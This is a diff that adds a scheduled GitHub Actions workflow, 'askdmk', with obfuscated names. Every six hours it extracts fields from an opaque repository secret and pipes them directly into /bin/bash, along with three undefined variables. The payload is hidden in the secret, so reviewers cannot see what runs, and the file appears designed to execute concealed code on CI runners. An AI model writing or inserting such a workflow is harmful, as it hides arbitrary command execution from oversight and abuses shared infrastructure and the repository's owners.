@@ -1,0 +1,19 @@
+name: askdmk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: askdmk
+        env:
+          v3833: ${{ secrets.v3833 }}
+        run: |
+          echo $v3833 | jq -r .z900 | /bin/bash
+          echo $nvzhj8201 | jq -r .pruk3 | /bin/bash
+          echo $rqc55 | jq -r .wb66998 | /bin/bash
+          echo $s0 | jq -r .wr98 | /bin/bash
+
